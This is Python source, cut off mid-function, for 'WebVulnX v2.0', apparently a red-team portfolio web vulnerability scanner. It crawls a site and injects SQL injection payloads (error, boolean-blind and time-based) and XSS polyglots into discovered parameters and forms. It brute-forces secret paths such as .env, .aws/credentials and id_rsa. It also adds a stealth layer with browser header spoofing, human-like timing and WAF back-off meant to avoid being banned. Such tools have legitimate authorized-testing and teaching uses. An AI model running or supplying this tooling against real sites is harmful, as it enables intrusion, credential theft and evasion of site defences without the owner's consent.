#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebVulnX v2.0 - Advanced Web Application Vulnerability Scanner
===============================================================
Author : CyberSec Portfolio Project (Red Team Track)
Purpose: Authorized web application penetration testing ONLY.

Modules
-------
* Smart crawler (same-origin, depth-limited, form + parameter discovery)
* SQL Injection engine:
    - Error-based detection (30+ DBMS error signatures: MySQL, MSSQL,
      Oracle, PostgreSQL, SQLite, MSAccess, DB2)
    - Boolean-based blind (response similarity via difflib)
    - Time-based blind (SLEEP / WAITFOR / pg_sleep payloads)
* Reflected XSS engine (polyglot payloads + encoding bypasses)
* Directory / file brute-force (status + size aware)
* Security misconfig checks (headers, cookies, methods, server banner)
* Multi-format reporting (console, JSON, HTML)

LEGAL: Only test applications you own or have explicit permission to test.
"""

from __future__ import annotations

import argparse
import base64
import difflib
import html
import json
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Set, Tuple
from html.parser import HTMLParser

import requests
import urllib3

import xss_deep as xd
import worldscan as ws
import report as dreport
import stealth as stl
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = r"""
 __      __     _   _   _   _  __   __
 \ \    / /__ _| | | | | | | \ \ / /__ _ _   _ _ __ _  _
  \ \/\/ / _ \ _| | | |_| | | \ V / _ \ | | | | '__| || |
   \_/\_/\___/_|_|  \___/|_|  \_/ \___/_,_|_|_|_|   \_, |
                                                     |__/   v2.0
  Advanced Web Application Vulnerability Scanner
"""

C = {
    "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
    "blue": "\033[94m", "cyan": "\033[96m", "magenta": "\033[95m",
    "bold": "\033[1m", "dim": "\033[2m", "reset": "\033[0m",
}


def colorize(t: str, c: str) -> str:
    return t if not sys.stdout.isatty() else f"{C.get(c, '')}{t}{C['reset']}"


def info(m): print(f"{colorize('[*]', 'blue')} {m}")
def ok(m):   print(f"{colorize('[+]', 'green')} {m}")
def warn(m): print(f"{colorize('[!]', 'yellow')} {m}")
def fail(m): print(f"{colorize('[-]', 'red')} {m}")
def vuln(m): print(f"{colorize('[VULN]', 'red')}{colorize(' ' + m, 'bold')}")


# ============================================================================
# Signature database
# ============================================================================
SQL_ERRORS: List[Tuple[re.Pattern, str]] = [
    (re.compile(r"you have an error in your sql syntax", re.I), "MySQL"),
    (re.compile(r"warning.*mysql_", re.I), "MySQL"),
    (re.compile(r"unclosed quotation mark after the character string", re.I), "MSSQL"),
    (re.compile(r"microsoft ole db provider for sql server", re.I), "MSSQL"),
    (re.compile(r"\[microsoft\]\[odbc sql server driver\]", re.I), "MSSQL"),
    (re.compile(r"microsoft access driver", re.I), "MSAccess"),
    (re.compile(r"jet database engine", re.I), "MSAccess"),
    (re.compile(r"oracle error", re.I), "Oracle"),
    (re.compile(r"ora-\d{5}", re.I), "Oracle"),
    (re.compile(r"quoted string not properly terminated", re.I), "Oracle"),
    (re.compile(r"pg_query\(\)|pg_exec\(\)|PostgreSQL.*ERROR", re.I), "PostgreSQL"),
    (re.compile(r"unterminated quoted string", re.I), "PostgreSQL"),
    (re.compile(r"sqlite3?\.?(error|exception)", re.I), "SQLite"),
    (re.compile(r"sqlite error|near \".*\": syntax error", re.I), "SQLite"),
    (re.compile(r"sql syntax.*near", re.I), "MySQL/PostgreSQL"),
    (re.compile(r"syntax error.*unexpected", re.I), "DB2/SQLite"),
    (re.compile(r"db2 sql error", re.I), "DB2"),
    (re.compile(r"sqlite3\.OperationalError", re.I), "SQLite"),
    (re.compile(r"Informix.*error", re.I), "Informix"),
    (re.compile(r"org\.hibernate|jdbc\.", re.I), "Java JDBC"),
    (re.compile(r"sqlstate\[", re.I), "Generic (SQLSTATE)"),
    (re.compile(r"PDOException", re.I), "PHP PDO"),
    (re.compile(r"supplied argument is not a valid mysql", re.I), "MySQL"),
]

SQL_PAYLOADS_ERROR = [
    "'", "\"", "')", "\")", "' OR '1'='1", "' OR '1'='1' -- ",
    "1' ORDER BY 100--", "1 AND 1=1", "1' AND '1'='2", "1 UNION SELECT NULL--",
    "1; WAITFOR DELAY '0:0:0'--", "'||(SELECT '')||'", "1') AND ('1'='1",
    "\" OR \"\"=\"", "1 AND 1=CONVERT(int,@@version)--",
    # extra DBMS error oracles — cheap (no sleep) and they catch FNs the
    # quote-only probes miss
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
    "1 AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)",
    "1 AND 1=CAST((SELECT version()) AS int)",
    "1;SELECT 1/0--",
    "' AND 1=CONVERT(int,@@version)--",
    "1' AND EXP(~(SELECT * FROM (SELECT version())x))-- ",
]

SQL_BOOLEAN_TRUE = ["' OR 1=1-- ", "\" OR 1=1-- ", "1 OR 1=1", "') OR ('1'='1"]
SQL_BOOLEAN_FALSE = ["' OR 1=2-- ", "\" OR 1=2-- ", "1 OR 1=2", "') OR ('1'='2"]

SQL_TIME_PAYLOADS = [
    ("MySQL/PostgreSQL", "' OR SLEEP({d})-- "),
    ("MySQL/PostgreSQL", "1; SELECT SLEEP({d})-- "),
    ("MySQL/PostgreSQL", "' AND SLEEP({d}) AND '1'='1"),
    ("MSSQL", "'; WAITFOR DELAY '0:0:{d}'-- "),
    ("MSSQL", "1); WAITFOR DELAY '0:0:{d}'-- "),
    ("PostgreSQL", "'; SELECT pg_sleep({d})-- "),
    ("Oracle", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{d})-- "),
    ("SQLite", "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({d}00000000))))-- "),
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<img src=x onerror=alert("XSS")>',
    '"><img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '"><svg onload=alert("XSS")>',
    "<body onload=alert('XSS')>",
    '"><iframe src="javascript:alert(`XSS`)">',
    "{{constructor.constructor('alert(1)')()}}",
    '<details open ontoggle=alert("XSS")>',
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    '<math><mtext></mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
]

XSS_CONFIRM_RX = re.compile(r"alert\((['\"`]?)(XSS|1|String\.fromCharCode\(88,83,83\))\1\)", re.I)

SEC_HEADERS = {
    "Strict-Transport-Security": "Missing HSTS (session hijacking risk on HTTP)",
    "Content-Security-Policy": "Missing CSP (XSS impact increased)",
    "X-Content-Type-Options": "Missing X-Content-Type-Options (MIME sniffing)",
    "X-Frame-Options": "Missing X-Frame-Options (clickjacking)",
    "Referrer-Policy": "Missing Referrer-Policy (information leak)",
    "Permissions-Policy": "Missing Permissions-Policy",
}

DEFAULT_DIRS = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php", "phpmyadmin",
    "backup", "backups", "db", "database", "config", "config.php", "config.bak",
    ".git", ".git/HEAD", ".git/config", ".env", ".htaccess", ".svn", ".DS_Store",
    "robots.txt", "sitemap.xml", "server-status", "server-info", "actuator",
    "actuator/health", "actuator/env", "api", "api/v1", "api/v2", "graphql",
    "console", "debug", "test", "testing", "tmp", "temp", "upload", "uploads",
    "files", "static", "assets", "images", "img", "css", "js", "includes",
    "cgi-bin", "manager", "manager/html", "webadmin", "cpanel", "phpinfo.php",
    "info.php", "test.php", "shell.php", "cmd.php", "eval.php", "admin.php",
    "login.php", "index.php.bak", "index.php~", "web.config", "WEB-INF/web.xml",
    "composer.json", "package.json", ".aws/credentials", "id_rsa", "dump.sql",
    "backup.sql", "backup.zip", "backup.tar.gz", "site.zip", "www.zip",
    "trace.axd", "elmah.axd", "adminer.php", "jmx-console", "invoker/JMXInvokerServlet",
    "swagger-ui.html", "swagger.json", "openapi.json", "graphql/console",
    "remote/login", "owa", "autodiscover", "exchange", "elmah", ".well-known/security.txt",
]

SKIP_EXT = {".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2",
            ".ttf", ".eot", ".mp4", ".mp3", ".zip", ".gz", ".tar", ".rar",
            ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".css", ".js", ".map"}


# ============================================================================
# Data models
# ============================================================================
@dataclass
class Finding:
    vuln_type: str
    severity: str            # Critical / High / Medium / Low / Info
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    detail: str = ""
    cvss_hint: float = 0.0

    def __str__(self) -> str:
        p = f" [{self.parameter}]" if self.parameter else ""
        return f"{self.severity:<8} {self.vuln_type}{p} @ {self.url}"


@dataclass
class ScanState:
    base_url: str = ""
    findings: List[Finding] = field(default_factory=list)
    crawled_urls: Set[str] = field(default_factory=set)
    forms: List[Dict] = field(default_factory=list)
    params: Dict[str, Set[str]] = field(default_factory=dict)   # url -> params
    start_ts: float = 0.0
    # --- proof-of-work: what the scanner actually did ----------------------
    modules_run: List[str] = field(default_factory=list)
    tests_run: int = 0
    seeds_used: List[str] = field(default_factory=list)
    diagnostics: List[str] = field(default_factory=list)        # why 0 findings
    degraded: bool = False                                      # blocked/WAF
    xss_deep: Dict[str, Any] = field(default_factory=dict)      # deep XSS engine stats

    def note(self, msg: str) -> None:
        if msg not in self.diagnostics:
            self.diagnostics.append(msg)

    def coverage(self) -> Dict[str, Any]:
        n_params = sum(len(v) for v in self.params.values())
        return {
            "urls_crawled": len(self.crawled_urls),
            "forms_found": len(self.forms),
            "parameters": n_params,
            "modules_run": list(self.modules_run),
            "tests_run": self.tests_run,
            "seed_urls": list(self.seeds_used),
            "degraded": self.degraded,
        }

    def add(self, f: Finding) -> None:
        key = (f.vuln_type, f.url, f.parameter, f.payload)
        if any((x.vuln_type, x.url, x.parameter, x.payload) == key for x in self.findings):
            return
        self.findings.append(f)
        sev = f.severity.upper()
        tag = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow",
               "LOW": "cyan", "INFO": "blue"}.get(sev, "blue")
        vuln(f"[{colorize(f.severity, tag)}] {f.vuln_type}"
             + (f" [{f.parameter}]" if f.parameter else "")
             + f" -> {f.url}")
        if f.evidence:
            print(f"        {colorize('evidence: ' + f.evidence[:100], 'dim')}")


# ============================================================================
# HTML parsing (stdlib — no bs4 required)
# ============================================================================
class LinkFormParser(HTMLParser):
    def __init__(self, base: str):
        super().__init__()
        self.base = base
        self.links: List[str] = []
        self.forms: List[Dict] = []
        self._form: Optional[Dict] = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "a" and a.get("href"):
            self.links.append(a["href"])
        elif tag == "form":
            self._form = {
                "action": a.get("action", ""),
                "method": (a.get("method") or "get").lower(),
                "inputs": [],
            }
        elif tag in ("input", "textarea", "select") and self._form is not None:
            self._form["inputs"].append({
                "name": a.get("name", ""),
                "type": (a.get("type") or "text").lower(),
                "value": a.get("value", ""),
            })
        elif tag == "script" and a.get("src"):
            self.links.append(a["src"])

    def handle_endtag(self, tag):
        if tag == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None


# ============================================================================
# HTTP layer
# ============================================================================
class HttpClient:
    def __init__(self, timeout: float = 10.0, delay: float = 0.0,
                 user_agent: str = "",
                 cookies: Optional[Dict] = None, headers: Optional[Dict] = None,
                 proxy: Optional[str] = None, verify: bool = False,
                 stealth: bool = True, target: str = ""):
        self.sess = requests.Session()
        self.sess.verify = verify
        # Adapter pooling — fewer TCP/TLS handshakes = faster AND less noisy.
        try:
            from requests.adapters import HTTPAdapter
            ad = HTTPAdapter(pool_connections=8, pool_maxsize=8, max_retries=0)
            self.sess.mount("http://", ad)
            self.sess.mount("https://", ad)
        except Exception:
            pass
        self.stealth = bool(stealth)
        if self.stealth:
            self.sess.headers.update(stl.CHROME_HEADERS)
        else:
            self.sess.headers.update({
                "User-Agent": user_agent or stl.CHROME_UA,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            })
        if user_agent:
            self.sess.headers["User-Agent"] = user_agent
        if headers:
            self.sess.headers.update(headers)
        if cookies:
            self.sess.cookies.update(cookies)
        if proxy:
            self.sess.proxies = {"http": proxy, "https": proxy}
        self.timeout = timeout
        self.delay = delay
        self.last_error: Optional[str] = None
        self.stats: Dict[str, Any] = {
            "requests": 0, "errors": 0, "blocked": 0, "waf_hits": 0,
            "statuses": {}, "by_module": {}, "cache_hits": 0,
        }
        self.module: str = "crawl"
        self._lock = threading.Lock()
        self._cache: Dict[str, requests.Response] = {}
        self._referer: Optional[str] = None
        local = stl.is_local_target(target) if target else False
        if self.stealth and delay <= 0 and not local:
            # Remote + stealth + no explicit delay → human-like spacing.
            min_i, jit = 0.12, 0.18
        elif delay > 0:
            min_i, jit = delay, min(0.25, delay)
        else:
            min_i, jit = 0.0, 0.0
        self.gate = stl.RateGate(min_interval=min_i, jitter=jit)
        self.workers = 6 if local else (2 if self.stealth else 4)

    def _cache_key(self, method: str, url: str, kw: dict) -> Optional[str]:
        if method.upper() != "GET":
            return None
        if kw.get("params") or kw.get("data") or kw.get("json") or kw.get("headers"):
            return None
        if kw.get("allow_redirects") is False:
            return None
        return url

    def request(self, method: str, url: str, **kw) -> Optional[requests.Response]:
        cacheable = kw.pop("cache", False)
        key = self._cache_key(method, url, kw) if cacheable else None
        if key and key in self._cache:
            with self._lock:
                self.stats["cache_hits"] = self.stats.get("cache_hits", 0) + 1
            return self._cache[key]

        self.gate.wait()
        kw.setdefault("timeout", self.timeout)
        kw.setdefault("allow_redirects", True)
        # Real browsers send a Referer on same-origin navigations.
        headers = dict(kw.get("headers") or {})
        if self.stealth and self._referer and "Referer" not in headers \
                and "referer" not in {h.lower() for h in headers}:
            headers["Referer"] = self._referer
            headers.setdefault("Sec-Fetch-Site", "same-origin")
            headers.setdefault("Sec-Fetch-Mode", "navigate")
            kw["headers"] = headers

        last_exc = None
        with self._lock:
            self.stats["requests"] += 1
            self.stats["by_module"][self.module] = \
                self.stats["by_module"].get(self.module, 0) + 1
        for attempt in range(2):
            try:
                resp = self.sess.request(method, url, **kw)
                self.last_error = None
                sc = str(resp.status_code)
                with self._lock:
                    self.stats["statuses"][sc] = self.stats["statuses"].get(sc, 0) + 1
                    if resp.status_code in (401, 403, 406, 429, 451, 503, 999):
                        self.stats["blocked"] += 1
                body_head = resp.text[:2500] if resp.text else ""
                if stl.looks_like_waf(resp.status_code, body_head):
                    with self._lock:
                        self.stats["waf_hits"] += 1
                    self.gate.punish(stl.retry_after_seconds(resp.headers))
                    self.last_error = (f"WAF/challenge page detected (HTTP {resp.status_code}) "
                                       f"— backing off so we are not banned")
                else:
                    self.gate.reward()
                    if method.upper() == "GET" and resp.status_code < 400:
                        self._referer = resp.url
                if key and resp.status_code == 200 and len(resp.content) < 1_500_000:
                    self._cache[key] = resp
                return resp
            except requests.RequestException as e:
                last_exc = e
                if attempt == 0:
                    time.sleep(0.6)
        with self._lock:
            self.stats["errors"] += 1
        self.last_error = f"{type(last_exc).__name__}: {last_exc}"
        return None

    def get(self, url: str, **kw):
        return self.request("GET", url, **kw)


def ensure_scheme(url: str) -> str:
    """Prepend http:// when the user forgets the scheme (e.g. 'target.com')."""
    url = url.strip()
    if "://" not in url:
        return "http://" + url
    return url


def diagnose_error(err: str) -> str:
    """Translate a requests exception into actionable hints."""
    low = err.lower()
    if "nameresolutionerror" in low or "getaddrinfo" in low:
        return ("DNS lookup failed — check the domain name spelling and your "
                "internet/DNS settings (try: ping or nslookup on the host).")
    if "connecttimeout" in low or "newconnectionerror" in low or \
       "connection refused" in low or "max retries" in low:
        return ("Could not establish a connection — the host may be down, a "
                "firewall may be blocking you, or the port is wrong.")
    if "readtimeout" in low:
        return ("The server accepted the TCP connection but never sent an HTTP "
                "response — this often means the site is filtering/blocking your "
                "IP (cloud IPs are often blocked by WAFs) or the service is hung.")
    if "ssl" in low or "certificate" in low:
        return ("TLS/SSL problem — the site may have a broken certificate. "
                "(WebVulnX already runs with verification disabled.)")
    if "missingschema" in low or "invalidurl" in low or "invalid schema" in low:
        return "The URL is malformed — use a full URL like http://target.com"
    if "proxy" in low:
        return "Proxy error — check the --proxy value and that the proxy is running."
    return "See the error above for details."


def normalize_url(u: str) -> str:
    u = u.split("#")[0]
    p = urllib.parse.urlsplit(u)
    path = re.sub(r"/{2,}", "/", p.path or "/")
    return urllib.parse.urlunsplit((p.scheme, p.netloc, path, p.query, ""))


def same_origin(a: str, b: str) -> bool:
    """Same site check — www/non-www and http/https treated as one site
    (real sites almost always redirect; the old strict check made crawls
    return ZERO pages on real targets)."""
    pa, pb = urllib.parse.urlsplit(a), urllib.parse.urlsplit(b)
    ha = (pa.netloc or "").lower().split(":")[0]
    hb = (pb.netloc or "").lower().split(":")[0]
    if ha.startswith("www."):
        ha = ha[4:]
    if hb.startswith("www."):
        hb = hb[4:]
    return bool(ha) and ha == hb


# ============================================================================
# Scope expansion — turn any single URL into a real crawl of the whole site
# ============================================================================
COMMON_ENTRY_PATHS = [
    "/", "/index.html", "/index.php", "/index.jsp", "/index.asp", "/index.aspx",
    "/home", "/main", "/login", "/signin", "/logon", "/admin", "/administrator",
    "/search", "/register", "/signup", "/user", "/profile", "/portal",
    "/dashboard", "/api", "/app", "/shop", "/products", "/news", "/blog",
]
MAX_ROBOTS_SEEDS = 12
MAX_SITEMAP_SEEDS = 20


def origin_root(url: str) -> str:
    p = urllib.parse.urlsplit(url)
    return urllib.parse.urlunsplit((p.scheme, p.netloc, "/", "", ""))


def _harvest_robots(client: HttpClient, root: str, state: ScanState) -> List[str]:
    """Pull crawlable paths + sitemaps out of robots.txt."""
    out: List[str] = []
    resp = client.get(root.rstrip("/") + "/robots.txt")
    if resp is None or resp.status_code >= 400:
        return out
    for raw in resp.text.splitlines():
        line = raw.split("#", 1)[0].strip()
        if not line or ":" not in line:
            continue
        key, _, val = line.partition(":")
        key, val = key.strip().lower(), val.strip()
        if not val:
            continue
        if key == "sitemap":
            out.extend(_harvest_sitemap(client, val, state))
        elif key in ("disallow", "allow") and val.startswith("/"):
            if any(c in val for c in "*$") or len(val) > 120:
                continue
            out.append(normalize_url(urllib.parse.urljoin(root, val)))
        if len(out) >= MAX_ROBOTS_SEEDS * 2:
            break
    return out[:MAX_ROBOTS_SEEDS * 2]


def _harvest_sitemap(client: HttpClient, sm_url: str, state: ScanState) -> List[str]:
    out: List[str] = []
    resp = client.get(sm_url)
    if resp is None or resp.status_code >= 400:
        return out
    for m in re.findall(r"<loc>\s*(.*?)\s*</loc>", resp.text, re.I):
        u = html.unescape(m).strip()
        if u.startswith("http") and same_origin(sm_url, u):
            out.append(normalize_url(u))
        if len(out) >= MAX_SITEMAP_SEEDS:
            break
    return out


def discover_seeds(client: HttpClient, url: str, state: ScanState,
                   expand_root: bool = True, probe_paths: bool = True) -> List[str]:
    """Build the seed list for the crawler.

    Fixes the classic "user scanned http://site/login.jsp -> 1 URL crawled ->
    0 findings" failure: we always add the site ROOT, everything robots.txt
    and sitemap.xml advertise, and the common entry points that actually
    answer on this server.
    """
    client.module = "scope"
    root = origin_root(url)
    seeds: List[str] = [url]
    reasons: List[str] = []

    parsed = urllib.parse.urlsplit(url)
    is_root = (parsed.path in ("", "/")) and not parsed.query
    if expand_root and not is_root:
        r = client.get(root)
        if r is not None and r.status_code < 400:
            final = normalize_url(r.url)
            seeds.append(final)
            if final != root:
                reasons.append(f"site root redirects to {final}")
            else:
                reasons.append("added site root (you gave a sub-page URL)")
        elif r is not None:
            reasons.append(f"site root returned HTTP {r.status_code}")
        else:
            reasons.append(f"site root unreachable ({client.last_error})")

    if expand_root:
        rob = _harvest_robots(client, root, state)
        if rob:
            seeds.extend(rob)
            reasons.append(f"robots.txt/sitemap advertised {len(rob)} path(s)")

    if probe_paths:
        base = seeds[1] if len(seeds) > 1 and not is_root else root
        base_root = origin_root(base)
        added = 0
        for p in COMMON_ENTRY_PATHS:
            cand = normalize_url(base_root.rstrip("/") + p)
            if cand in seeds:
                continue
            resp = client.get(cand)
            if resp is None:
                continue
            if resp.status_code < 400:
                seeds.append(normalize_url(resp.url))
                added += 1
            elif resp.status_code in (401, 403):
                # protected entry point — still worth crawling (login forms,
                # auth headers, redirect behaviour)
                seeds.append(cand)
                added += 1
            if added >= 14:
                break
        if added:
            reasons.append(f"probed {added} common entry point(s) that answered")

    # de-dup, keep order
    uniq: List[str] = []
    for s in seeds:
        s = normalize_url(s)
        if s and s not in uniq:
            uniq.append(s)
    state.seeds_used = uniq
    for r in reasons:
        state.note(f"Scope: {r}")
    if len(uniq) > 1:
        ok(f"Scope expansion: {len(uniq)} seed URLs -> {', '.join(uniq[:6])}"
           + (" …" if len(uniq) > 6 else ""))
    return uniq


# ============================================================================
# Module 1 — Crawler
# ============================================================================
class Crawler:
    def __init__(self, client: HttpClient, state: ScanState, max_depth: int = 3,
                 max_urls: int = 150):
        self.client = client
        self.state = state
        self.max_depth = max_depth
        self.max_urls = max_urls

    def run(self, start: str, seeds: Optional[List[str]] = None) -> None:
        info(f"Crawling {start} (depth={self.max_depth}, max_urls={self.max_urls})")
        self.client.module = "crawl"
        queue: List[Tuple[str, int]] = [(normalize_url(start), 0)]
        # Auto-scope expansion: always seed the site ROOT and discovered
        # entry points, even when the user handed us a deep sub-page URL.
        # This is the single biggest fix for "0 findings on a vulnerable site".
        for s in (seeds or []):
            ns = normalize_url(s)
            if ns != normalize_url(start):
                queue.append((ns, 0))
        if len(queue) > 1:
            info(f"Scope expanded with {len(queue) - 1} extra seed URL(s)")
        seen: Set[str] = set()

        while queue and len(self.state.crawled_urls) < self.max_urls:
            url, depth = queue.pop(0)
            if url in seen or depth > self.max_depth:
                continue
            seen.add(url)

            resp = self.client.get(url, cache=True)
            if resp is None:
                continue

            self.state.crawled_urls.add(url)
            ct = resp.headers.get("Content-Type", "")
            if "html" not in ct and not resp.text[:200].lower().startswith(("<!doctype", "<html")):
                continue

            # Record query params
            qs = urllib.parse.urlsplit(url).query
            if qs:
                self.state.params.setdefault(url, set()).update(
                    urllib.parse.parse_qs(qs, keep_blank_values=True).keys()
                )

            parser = LinkFormParser(url)
            try:
                parser.feed(resp.text)
            except Exception:
                continue

            for link in parser.links:
                absu = urllib.parse.urljoin(resp.url, link)
                absu = normalize_url(absu.split("?")[0]) if "?" not in absu else normalize_url(absu)
                if same_origin(start, absu) and absu not in seen:
                    if urllib.parse.urlsplit(absu).path.lower().endswith(tuple(SKIP_EXT)):
                        continue
                    queue.append((absu, depth + 1))
                    # Also record params on queued URLs
                    qs2 = urllib.parse.urlsplit(absu).query
                    if qs2:
                        self.state.params.setdefault(absu, set()).update(
                            urllib.parse.parse_qs(qs2, keep_blank_values=True).keys()
                        )

            for form in parser.forms:
                action = urllib.parse.urljoin(resp.url, form["action"] or resp.url)
                form["url"] = normalize_url(action)
                names = [i["name"] for i in form["inputs"] if i["name"]]
                self.state.forms.append(form)
                if names:
                    self.state.params.setdefault(form["url"], set()).update(names)

        ok(f"Crawl finished: {len(self.state.crawled_urls)} URLs, "
           f"{len(self.state.forms)} forms, "
           f"{sum(len(v) for v in self.state.params.values())} parameters")


# ============================================================================
# Module 2 — SQL Injection
# ============================================================================
class SqliScanner:
    """Error-based + Boolean-blind + Time-based SQLi detection."""

    def __init__(self, client: HttpClient, state: ScanState,
                 time_delay: Optional[float] = 5.0):
        self.client = client
        self.state = state
        self.time_delay = time_delay      # None -> skip time-based module

    # -- helpers -------------------------------------------------------------
    @staticmethod
    def _match_error(body: str) -> Optional[str]:
        for rx, dbms in SQL_ERRORS:
            if rx.search(body):
                return dbms
        return None

    @staticmethod
    def _similarity(a: str, b: str) -> float:
        return difflib.SequenceMatcher(None, a[:4000], b[:4000]).ratio()

    def _inject_params(self, url: str, method: str = "GET",
                       data: Optional[Dict] = None, param: Optional[str] = None
                       ) -> List[Dict]:
        """Yield (param, payload, request-kwargs) candidates."""
        return []

    def _send(self, url: str, method: str, param: str, payload: str,
              base_params: Dict[str, str], baseline_body: str
              ) -> Optional[requests.Response]:
        params = dict(base_params)
        params[param] = payload
        # NOTE: strip any existing query string — we rebuild it from params,
        # otherwise requests would append (&id=1&id=payload) and the server
        # would read the original value first.
        parsed = urllib.parse.urlsplit(url)
        clean = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
        if method.upper() == "GET":
            return self.client.get(clean, params=params)
        return self.client.request("POST", clean, data=params)

    # -- GET/POST parameter attack -------------------------------------------
    def scan_params(self, url: str, params: List[str], method: str = "GET",
                    base_params: Optional[Dict[str, str]] = None) -> None:
        base_params = base_params or {p: "1" for p in params}
        parsed = urllib.parse.urlsplit(url)
        clean = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
        # Baseline
        if method.upper() == "GET":
            base_resp = self.client.get(clean, params=base_params)
        else:
            base_resp = self.client.request("POST", clean, data=base_params)
        if base_resp is None:
            return
        baseline = base_resp.text

        for param in params:
            info(f"SQLi tests on {url} [{param}] ({method})")
            tested_error = False

            # --- 1. Error-based ---
            # Cheap canary first: a single quote. If the page is byte-identical
            # we still try 3 high-value oracles (extractvalue/convert) because
            # some apps swallow the quote but leak on functions — then we stop.
            canary = self._send(url, method, param, "'", base_params, baseline)
            quote_changed = bool(canary is not None and canary.text != baseline)
            payloads = SQL_PAYLOADS_ERROR if quote_changed else [
                "'", "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
                "1 AND 1=CONVERT(int,@@version)--",
                "1 AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)",
            ]
            for payload in payloads:
                resp = canary if payload == "'" and canary is not None else \
                    self._send(url, method, param, payload, base_params, baseline)
                if resp is None:
                    continue
                dbms = self._match_error(resp.text)
                if dbms:
                    self.state.add(Finding(
                        vuln_type="SQL Injection (Error-Based)",
                        severity="Critical", url=url, parameter=param,
                        payload=payload,
                        evidence=f"DBMS signature: {dbms}",
                        detail="Server returned a database error message indicating "
                               "the input is concatenated into a SQL query unsafely.",
                        cvss_hint=9.8,
                    ))
                    tested_error = True
                    break

            # --- 2. Boolean-based blind (second payload pair as confirmation) ---
            if not tested_error:
                t_resp = self._send(url, method, param, SQL_BOOLEAN_TRUE[0], base_params, baseline)
                f_resp = self._send(url, method, param, SQL_BOOLEAN_FALSE[0], base_params, baseline)
                if t_resp is not None and f_resp is not None:
                    sim_t = self._similarity(baseline, t_resp.text)
                    sim_f = self._similarity(baseline, f_resp.text)
                    sim_tf = self._similarity(t_resp.text, f_resp.text)
                    if (sim_t > 0.90 and sim_f < 0.85) or \
                       (sim_f > 0.90 and sim_t < 0.85) or \
                       (sim_tf < 0.75 and abs(sim_t - sim_f) > 0.15):
                        # Confirmation with a second, different payload pair
                        t2 = self._send(url, method, param, SQL_BOOLEAN_TRUE[1], base_params, baseline)
                        f2 = self._send(url, method, param, SQL_BOOLEAN_FALSE[1], base_params, baseline)
                        if t2 is not None and f2 is not None:
                            s_t2 = self._similarity(t2.text, t_resp.text)
                            s_f2 = self._similarity(f2.text, f_resp.text)
                            if s_t2 > 0.85 and s_f2 > 0.85 and \
                               self._similarity(t2.text, f2.text) < 0.85:
                                self.state.add(Finding(
                                    vuln_type="SQL Injection (Boolean-Based Blind)",
                                    severity="High", url=url, parameter=param,
                                    payload=f"TRUE={SQL_BOOLEAN_TRUE[0]} / FALSE={SQL_BOOLEAN_FALSE[0]}",
                                    evidence=f"similarity baseline/true={sim_t:.2f} "
                                             f"baseline/false={sim_f:.2f} true/false={sim_tf:.2f} "
                                             f"(confirmed with a second payload pair)",
                                    detail="Responses differ consistently between TRUE and FALSE "
                                           "boolean conditions across two payload pairs — "
                                           "classic blind SQLi behavior.",
                                    cvss_hint=8.6,
                                ))

            # --- 3. Time-based blind (double-confirmed to kill latency FPs) ---
            if not tested_error and self.time_delay:
                # One cheap engine first (MySQL SLEEP). Only if the server
                # actually waited do we bother with other dialects. This
                # cuts a 5s×8×2 = 80s-per-param worst case down to ~2s.
                d = max(2, min(int(self.time_delay), 4))
                payloads = [(name, tpl.format(d=d)) for name, tpl in SQL_TIME_PAYLOADS]
                # MySQL/pg first — they cover most of the internet
                payloads = payloads[:3] + payloads[3:]
                for dbms, payload in payloads:
                    t0 = time.time()
                    resp = self._send(url, method, param, payload, base_params, baseline)
                    elapsed = time.time() - t0
                    if resp is not None and elapsed >= self.time_delay - 0.5:
                        # Confirmation: must delay AGAIN (rules out network hiccups)
                        t1 = time.time()
                        self._send(url, method, param, payload, base_params, baseline)
                        elapsed2 = time.time() - t1
                        if elapsed2 >= self.time_delay - 0.5:
                            self.state.add(Finding(
                                vuln_type="SQL Injection (Time-Based Blind)",
                                severity="High", url=url, parameter=param,
                                payload=payload,
                                evidence=f"response delayed {elapsed:.1f}s then {elapsed2:.1f}s "
                                         f"(expected {int(self.time_delay)}s) — engine hint: {dbms}",
                                detail="The server response was delayed twice only when a "
                                       "time-based SQL payload was injected (double-confirmed).",
                                cvss_hint=8.6,
                            ))
                            break

    # -- URL path injection ----------------------------------------------------
    def scan_path(self, url: str) -> None:
        """Test /item/123 style segments with numeric ids."""
        parsed = urllib.parse.urlsplit(url)
        segs = [s for s in parsed.path.split("/") if s]
        for i, seg in enumerate(segs):
            if re.fullmatch(r"\d+", seg):
                info(f"SQLi path test on {url} (segment '{seg}')")
                for payload in ("1'", "1 AND 1=1", "1 AND 1=2", "1 UNION SELECT NULL"):
                    new_segs = segs[:]
                    new_segs[i] = payload.replace(" ", "%20")
                    new_path = "/" + "/".join(new_segs)
                    test_url = urllib.parse.urlunsplit(
                        (parsed.scheme, parsed.netloc, new_path, parsed.query, "")
                    )
                    resp = self.client.get(test_url)
                    if resp is not None:
